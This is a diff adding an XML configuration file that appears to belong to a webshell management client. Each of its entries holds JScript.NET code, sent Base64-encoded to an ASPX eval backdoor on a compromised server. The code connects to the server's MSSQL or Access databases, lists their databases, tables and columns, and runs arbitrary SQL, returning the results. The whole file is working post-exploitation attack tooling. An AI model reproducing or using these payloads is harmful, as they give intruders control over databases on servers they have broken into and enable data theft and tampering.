@@ -1,0 +1,356 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<customShellType>
+  <funcCodeSetting>
+    <func>
+      <name>ConnectDb</name>
+	  <type>aspxEval</type>
+	  <path>/DbManager/mssql_oledb,/DbManager/access_oledb</path>
+	  <funcParam location="Body" encrymode="Base64" >connStr</funcParam>
+      <item><![CDATA[var connStr=System.Text.Encoding.Default.GetString(System.Convert.FromBase64String(Request.Item["$connStr$"]));
+var conn = new System.Data.OleDb.OleDbConnection(connStr);
+try
+{
+	conn.Open();
+	Response.Write(1);
+}
+catch(ex)
+{
+	conn.Close();
+	throw new Exception(ex.ToString());
+}]]></item>
+    </func>
+	<func>
+      <name>GetDbName</name>
+	  <type>aspxEval</type>
+	  <path>/DbManager/access_oledb</path>
+	  <funcParam location="Body" encrymode="Base64" >connStr</funcParam>
+      <item><![CDATA[var connStr=System.Text.Encoding.Default.GetString(System.Convert.FromBase64String(Request.Item["$connStr$"]));
+var conn = new System.Data.OleDb.OleDbConnection(connStr);
+try
+{
+	conn.Open();
+	Response.Write("mdb\t");
+}
+catch(ex)
+{
+	conn.Close();
+	throw new Exception(ex.ToString());
+}]]></item>
+    </func>
+	<func>
+      <name>GetTableName</name>
+	  <type>aspxEval</type>
+	  <path>/DbManager/access_oledb</path>
+	  <funcParam location="Body" encrymode="Base64" >connStr</funcParam>
+	  <funcParam location="Body" encrymode="Base64" >dbName</funcParam>
+      <item><![CDATA[var connStr=System.Text.Encoding.Default.GetString(System.Convert.FromBase64String(Request.Item["$connStr$"]));
+var conn = new System.Data.OleDb.OleDbConnection(connStr);
+try
+{
+	conn.Open();
+    var dt = conn.GetSchema("Tables");
+	var content="";
+	for(var i=0; i<dt.Rows.Count; i++)
+    {
+		if(dt.Rows[i][3]=="TABLE")
+			content+=dt.Rows[i][2]+"\t";
+    }
+	Response.Write(content);
+}
+catch(ex)
+{
+	conn.Close();
+	throw new Exception(ex.ToString());
+}]]></item>
+    </func>
+	<func>
+      <name>GetColumnType</name>
+	  <type>aspxEval</type>
+	  <path>/DbManager/access_oledb</path>
+	  <funcParam location="Body" encrymode="Base64" >connStr</funcParam>
+	  <funcParam location="Body" encrymode="Base64" >dbName</funcParam>
+	  <funcParam location="Body" encrymode="Base64" >columnName</funcParam>
+      <item><![CDATA[function TN(n:Int32):String
+{switch(n){
+	case 2:return "smallint";
+	case 3:return "int";
+	case 4:return "real";
+	case 5:return "float";
+	case 6:return "money";
+	case 7:return "datetime";
+	case 11:return "bit";
+	case 12:return "variant";
+	case 16:return "tinyint";
+	case 17:return "tinyint";
+	case 20:return "bigint";
+	case 72:return "unique";
+	case 128:return "binary";
+	case 129:return "char";
+	case 130:return "nchar";
+	case 131:return "numeric";
+	case 135:return "datetime";
+	case 200:return "varchar";
+	case 201:return "text";
+	case 202:return "nvarchar";
+	case 203:return "ntext";
+	case 204:return "varbinary";
+	case 205:return "image";
+	default:return n;
+}}
+var connStr=System.Text.Encoding.Default.GetString(System.Convert.FromBase64String(Request.Item["$connStr$"]));
+var columnName=System.Text.Encoding.Default.GetString(System.Convert.FromBase64String(Request.Item["$columnName$"]));
+var conn = new System.Data.OleDb.OleDbConnection(connStr);
+try
+{
+	conn.Open();
+    var dt = conn.GetSchema("Columns");
+	var content="";
+	for(var i=0; i<dt.Rows.Count; i++)
+    {
+		if(dt.Rows[i][2]==columnName)
+		{
+        content+=dt.Rows[i][3]+"("+TN(dt.Rows[i][11])+")\t";
+		}
+    }
+	Response.Write(content);
+}
+catch(ex)
+{
+	conn.Close();
+	throw new Exception(ex.ToString());
+}]]></item>
+    </func>
+  	<func>
+      <name>ExecuteReader</name>
+	  <type>aspxEval</type>
+	  <path>/DbManager/access_oledb</path>
+	  <funcParam location="Body" encrymode="Base64" >connStr</funcParam>
+	  <funcParam location="Body" encrymode="Base64" >dbName</funcParam>
+	  <funcParam location="Body" encrymode="Base64" >sqlStr</funcParam>
+      <item><![CDATA[var connStr=System.Text.Encoding.Default.GetString(System.Convert.FromBase64String(Request.Item["$connStr$"]));
+var sql=System.Text.Encoding.Default.GetString(System.Convert.FromBase64String(Request.Item["$sqlStr$"]));
+var conn = new System.Data.OleDb.OleDbConnection(connStr);
+try
+{
+	conn.Open();
+	var comm = new System.Data.OleDb.OleDbCommand(sql, conn);
+    var reader = comm.ExecuteReader();
+    var dt = new System.Data.DataTable();
+    dt.Load(reader);
+    reader.Close();
+
+	var t="\t|\t",n="\r\n",content="";
+	for(var i=0; i<dt.Columns.Count; i++)
+    {
+		content+=dt.Columns[i].ColumnName+t;
+	}
+	content+=n;
+	for(var i=0; i<dt.Rows.Count; i++)
+    {
+        for (var j = 0; j < dt.Columns.Count; j++)
+        {
+			content+=dt.Rows[i][j]+t;
+        }
+		content+=n;
+    }
+	Response.Write(content);
+}
+catch(ex)
+{
+	conn.Close();
+	throw new Exception(ex.ToString());
+}]]></item>
+    </func>
+	<func>
+      <name>ExecuteNonQuery</name>
+	  <type>aspxEval</type>
+	  <path>/DbManager/access_oledb</path>
+	  <funcParam location="Body" encrymode="Base64" >connStr</funcParam>
+	  <funcParam location="Body" encrymode="Base64" >dbName</funcParam>
+	  <funcParam location="Body" encrymode="Base64" >sqlStr</funcParam>
+      <item><![CDATA[var connStr=System.Text.Encoding.Default.GetString(System.Convert.FromBase64String(Request.Item["$connStr$"]));
+var sql=System.Text.Encoding.Default.GetString(System.Convert.FromBase64String(Request.Item["$sqlStr$"]));
+var conn = new System.Data.OleDb.OleDbConnection(connStr);
+try
+{
+	conn.Open();
+	var comm = new System.Data.OleDb.OleDbCommand(sql, conn);
+    var n = comm.ExecuteNonQuery();
+	
+	Response.Write("Result\r\n"+n+" rows affected");
+}
+catch(ex)
+{
+	conn.Close();
+	throw new Exception(ex.ToString());
+}]]></item>
+    </func>
+    <func>
+      <name>GetDbName</name>
+	  <type>aspxEval</type>
+	  <path>/DbManager/mssql_oledb</path>
+	  <funcParam location="Body" encrymode="Base64" >connStr</funcParam>
+      <item><![CDATA[var connStr=System.Text.Encoding.Default.GetString(System.Convert.FromBase64String(Request.Item["$connStr$"]));
+var sql = "SELECT name FROM Master..SysDatabases ORDER BY 1;";
+var conn = new System.Data.OleDb.OleDbConnection(connStr);
+try
+{
+	conn.Open();
+	var comm = new System.Data.OleDb.OleDbCommand(sql, conn);
+    var reader = comm.ExecuteReader();
+    var dt = new System.Data.DataTable();
+    dt.Load(reader);
+    reader.Close();
+
+	var t="\t",content="";
+	for(var i=0; i<dt.Rows.Count; i++)
+    {
+        content+=dt.Rows[i][0]+t;
+    }
+	Response.Write(content);
+}
+catch(ex)
+{
+	conn.Close();
+	throw new Exception(ex.ToString());
+}]]></item>
+    </func>
+	<func>
+      <name>GetTableName</name>
+	  <type>aspxEval</type>
+	  <path>/DbManager/mssql_oledb</path>
+	  <funcParam location="Body" encrymode="Base64" >connStr</funcParam>
+	  <funcParam location="Body" encrymode="Base64" >dbName</funcParam>
+      <item><![CDATA[var connStr=System.Text.Encoding.Default.GetString(System.Convert.FromBase64String(Request.Item["$connStr$"]));
+var dbName=System.Text.Encoding.Default.GetString(System.Convert.FromBase64String(Request.Item["$dbName$"]));
+var sql = "SELECT name FROM sysobjects WHERE (xtype='U') ORDER BY 1;";
+var conn = new System.Data.OleDb.OleDbConnection(connStr);
+try
+{
+	conn.Open();
+	conn.ChangeDatabase(dbName);
+	var comm = new System.Data.OleDb.OleDbCommand(sql, conn);
+    var reader = comm.ExecuteReader();
+    var dt = new System.Data.DataTable();
+    dt.Load(reader);
+    reader.Close();
+
+	var t="\t",content="";
+	for(var i=0; i<dt.Rows.Count; i++)
+    {
+        content+=dt.Rows[i][0]+t;
+    }
+	Response.Write(content);
+}
+catch(ex)
+{
+	conn.Close();
+	throw new Exception(ex.ToString());
+}]]></item>
+    </func>
+	<func>
+      <name>GetColumnType</name>
+	  <type>aspxEval</type>
+	  <path>/DbManager/mssql_oledb</path>
+	  <funcParam location="Body" encrymode="Base64" >connStr</funcParam>
+	  <funcParam location="Body" encrymode="Base64" >dbName</funcParam>
+	  <funcParam location="Body" encrymode="Base64" >columnName</funcParam>
+      <item><![CDATA[var connStr=System.Text.Encoding.Default.GetString(System.Convert.FromBase64String(Request.Item["$connStr$"]));
+var dbName=System.Text.Encoding.Default.GetString(System.Convert.FromBase64String(Request.Item["$dbName$"]));
+var columnName=System.Text.Encoding.Default.GetString(System.Convert.FromBase64String(Request.Item["$columnName$"]));
+var sql = "SELECT A.[name],B.[name] FROM syscolumns A,systypes B where A.id=object_id('"+columnName+"') and A.xtype=B.xtype ORDER BY A.colid;";
+var conn = new System.Data.OleDb.OleDbConnection(connStr);
+try
+{
+	conn.Open();
+	conn.ChangeDatabase(dbName);
+	var comm = new System.Data.OleDb.OleDbCommand(sql, conn);
+    var reader = comm.ExecuteReader();
+    var dt = new System.Data.DataTable();
+    dt.Load(reader);
+    reader.Close();
+
+	var t="\t",content="";
+	for(var i=0; i<dt.Rows.Count; i++)
+    {
+        content+=dt.Rows[i][0]+"("+dt.Rows[i][1]+")"+t;
+    }
+	Response.Write(content);
+}
+catch(ex)
+{
+	conn.Close();
+	throw new Exception(ex.ToString());
+}]]></item>
+    </func>
+	<func>
+      <name>ExecuteReader</name>
+	  <type>aspxEval</type>
+	  <path>/DbManager/mssql_oledb</path>
+	  <funcParam location="Body" encrymode="Base64" >connStr</funcParam>
+	  <funcParam location="Body" encrymode="Base64" >dbName</funcParam>
+	  <funcParam location="Body" encrymode="Base64" >sqlStr</funcParam>
+      <item><![CDATA[var connStr=System.Text.Encoding.Default.GetString(System.Convert.FromBase64String(Request.Item["$connStr$"]));
+var dbName=System.Text.Encoding.Default.GetString(System.Convert.FromBase64String(Request.Item["$dbName$"]));
+var sql=System.Text.Encoding.Default.GetString(System.Convert.FromBase64String(Request.Item["$sqlStr$"]));
+var conn = new System.Data.OleDb.OleDbConnection(connStr);
+try
+{
+	conn.Open();
+	conn.ChangeDatabase(dbName);
+	var comm = new System.Data.OleDb.OleDbCommand(sql, conn);
+    var reader = comm.ExecuteReader();
+    var dt = new System.Data.DataTable();
+    dt.Load(reader);
+    reader.Close();
+
+	var t="\t|\t",n="\r\n",content="";
+	for(var i=0; i<dt.Columns.Count; i++)
+    {
+		content+=dt.Columns[i].ColumnName+t;
+	}
+	content+=n;
+	for(var i=0; i<dt.Rows.Count; i++)
+    {
+        for (var j = 0; j < dt.Columns.Count; j++)
+        {
+			content+=dt.Rows[i][j]+t;
+        }
+		content+=n;
+    }
+	Response.Write(content);
+}
+catch(ex)
+{
+	conn.Close();
+	throw new Exception(ex.ToString());
+}]]></item>
+    </func>
+	<func>
+      <name>ExecuteNonQuery</name>
+	  <type>aspxEval</type>
+	  <path>/DbManager/mssql_oledb</path>
+	  <funcParam location="Body" encrymode="Base64" >connStr</funcParam>
+	  <funcParam location="Body" encrymode="Base64" >dbName</funcParam>
+	  <funcParam location="Body" encrymode="Base64" >sqlStr</funcParam>
+      <item><![CDATA[var connStr=System.Text.Encoding.Default.GetString(System.Convert.FromBase64String(Request.Item["$connStr$"]));
+var dbName=System.Text.Encoding.Default.GetString(System.Convert.FromBase64String(Request.Item["$dbName$"]));
+var sql=System.Text.Encoding.Default.GetString(System.Convert.FromBase64String(Request.Item["$sqlStr$"]));
+var conn = new System.Data.OleDb.OleDbConnection(connStr);
+try
+{
+	conn.Open();
+	conn.ChangeDatabase(dbName);
+	var comm = new System.Data.OleDb.OleDbCommand(sql, conn);
+    var n = comm.ExecuteNonQuery();
+	
+	Response.Write("Result\r\n"+n+" rows affected");
+}
+catch(ex)
+{
+	conn.Close();
+	throw new Exception(ex.ToString());
+}]]></item>
+    </func>
+  </funcCodeSetting>
+</customShellType>
